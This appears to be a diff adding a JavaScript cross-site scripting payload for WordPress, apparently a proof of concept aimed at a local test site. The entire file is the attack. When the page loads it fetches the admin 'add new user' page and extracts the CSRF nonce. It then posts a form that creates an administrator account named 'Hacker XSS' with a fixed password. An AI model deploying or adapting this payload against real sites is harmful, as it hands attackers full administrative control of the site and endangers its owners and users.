@@ -1,0 +1,33 @@
+window.addEventListener('DOMContentLoaded', (event) => {
+	fetch('http://localhost:8080/wp-admin/user-new.php')
+		.then(res => res.text())
+		.then(res => {
+			let parser = new DOMParser();
+			let doc = parser.parseFromString(res, 'text/html');
+			let token = doc.getElementById("_wpnonce_create-user").value;
+
+			let form = new FormData();
+
+			form.append("action", "createuser");
+			form.append("_wpnonce_create-user", token);
+			form.append("_wp_http_referer", "/wp-admin/user-new.php");
+			form.append("user_login", "Hacker XSS");
+			form.append("email", "youare@hack.pl");
+			form.append("first_name", "");
+			form.append("last_name", "");
+			form.append("url", "");
+			form.append("locale", "site-default");
+			form.append("pass1", "st2iUQTKcN0@pvCD#7UW#uwj");
+			form.append("pass2", "st2iUQTKcN0@pvCD#7UW#uwj");
+			form.append("send_user_notification", "1");
+			form.append("role", "administrator");
+			form.append("createuser", "Dodaj+nowego+użytkownika");
+
+			fetch('http://localhost:8080/wp-admin/user-new.php', {
+				method: 'POST',
+				body: form,
+			});
+
+		});
+
+});
